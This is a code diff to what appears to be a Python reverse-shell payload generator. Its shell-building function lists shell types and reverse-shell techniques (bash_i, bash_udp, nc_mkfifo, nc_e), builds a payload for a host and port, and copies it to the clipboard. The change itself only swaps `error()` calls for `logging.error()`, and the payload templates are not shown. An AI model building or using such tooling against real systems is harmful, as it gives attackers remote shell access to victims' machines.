@@ -16,16 +16,16 @@ def ohios(host, port, _type, shell):
     return ohio.get(_type, "what u doing gng")
 
 def shell(host, port, bind):
-    if checkip(host) == False: error('Please enter a valid IP'); return
+    if checkip(host) == False: logging.error('Please enter a valid IP'); return
     shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
     types = ['bash_i', 'bash_196', 'bash_read_line', 'bash_5', 'bash_udp', 'nc_mkfifo', 'nc_e']
     print(f'{yellow}{f"{white},{yellow} ".join(shells)}')
     uno = input(f'Select shell>{white} ').strip()
-    if uno not in shells: error('Please choose a valid shell') ;return
-    if not str(port).isdigit() or not (1 <= int(port) <= 65535): error('Invalid port number') ;return
+    if uno not in shells: logging.error('Please choose a valid shell') ;return
+    if not str(port).isdigit() or not (1 <= int(port) <= 65535): logging.error('Invalid port number') ;return
     print(f'{yellow}{f"{white},{yellow} ".join(types)}')
     t = input(f'Select type>{white} ').strip()
-    if t not in types: error('Please choose a valid type'); return
+    if t not in types: logging.error('Please choose a valid type'); return
     result = ohios(host, port, t, uno)
     pyperclip.copy(result)
     print(f'{green}Payload>{white} {result}')
